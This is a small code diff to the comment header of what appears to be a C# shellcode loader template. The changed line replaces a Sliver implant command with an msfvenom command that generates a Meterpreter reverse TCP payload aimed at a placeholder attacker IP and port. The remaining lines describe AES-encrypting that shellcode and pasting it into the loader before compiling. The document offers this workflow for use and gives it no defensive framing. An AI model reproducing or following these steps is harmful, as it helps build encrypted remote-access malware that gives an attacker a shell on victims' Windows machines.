@@ -2,7 +2,7 @@
 // TEMPLATE — replace buf with your encrypted shellcode before compiling
 //
 // Generate and encrypt shellcode:
-//   1. sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
+//   1. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
 //   2. Paste bytes into aes-shellcode-encryption.cs and run it
 //   3. Copy the output buf here and update the byte count
 //
